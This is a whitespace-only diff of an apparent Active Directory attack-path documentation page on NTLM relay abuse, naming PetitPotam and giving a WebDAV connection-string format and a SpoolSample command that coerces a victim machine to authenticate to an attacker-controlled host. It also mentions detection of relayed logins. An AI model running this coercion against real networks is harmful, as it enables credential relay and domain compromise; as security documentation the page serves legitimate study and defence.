@@ -52,7 +52,7 @@ This section provides general guidance about abusing this edge. For detailed ins
    - [PetitPotam](https://github.com/topotam/PetitPotam)
 
    To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV Connection String format: `\\SERVER_NETBIOS@PORT/PATH/TO/FILE`.
-   
+
    ```ps
    SpoolSample.exe "VICTIM_IP" "ATTACKER_NETBIOS@PORT/file.txt"
    ```
@@ -63,9 +63,9 @@ NTLM relayed authentications can be detected by login events where the IP addres
 
 ## Edge Schema
 
-Source: `Authenticated Users`, [Group](/resources/nodes/group)  
-Destination: [Computer](/resources/nodes/computer)  
-Traversable: **Yes**  
+Source: `Authenticated Users`, [Group](/resources/nodes/group)
+Destination: [Computer](/resources/nodes/computer)
+Traversable: **Yes**
 
 ## References
 
